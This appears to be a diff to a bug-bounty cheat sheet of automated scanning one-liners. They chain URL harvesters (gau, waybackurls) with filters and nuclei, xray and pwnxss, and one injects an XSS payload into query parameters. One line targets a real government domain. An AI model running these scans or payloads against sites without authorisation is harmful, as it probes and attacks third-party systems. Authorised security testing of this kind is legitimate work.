@@ -41,3 +41,12 @@ python3 pwnxss.py -u http://d.com
 
 #XRAY
 ./xray_linux_amd64 ws --basic-crawler https://jakarta.go.id --plugins sqldet --html-output vuln.html
+
+#nuclei rb
+echo "testphp.vulnweb.com" | gau --fc 200 | nuclei -t ~/nuclei-templates/dast/vulnerabilities/ -dast -silent
+
+#rb 1
+echo "redacted.com" | waybackurls --fc 200 | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
+
+#rb 2
+echo "redacted.com" | gau --fc 200 | urldedupe -s -qs | gf lfi redirect sqli-error sqli ssrf ssti xss xee | qsreplace FUZZ | grep FUZZ | nuclei -silent -t ~/nuclei-templates/dast/vulnerabilities/ -dast
